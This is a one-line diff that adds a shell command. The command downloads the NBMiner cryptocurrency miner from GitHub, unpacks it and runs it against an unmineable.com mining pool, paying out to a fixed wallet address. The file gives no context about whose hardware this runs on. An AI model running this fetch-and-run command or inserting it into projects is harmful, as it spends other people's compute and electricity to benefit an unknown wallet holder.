@@ -1,0 +1,1 @@
+wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz && tar -xvf NBMiner_36.1_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u BTT:TH9fCCqtpdsiuoBRU6pyqBF8nJDmJdo3dG.hgg -log
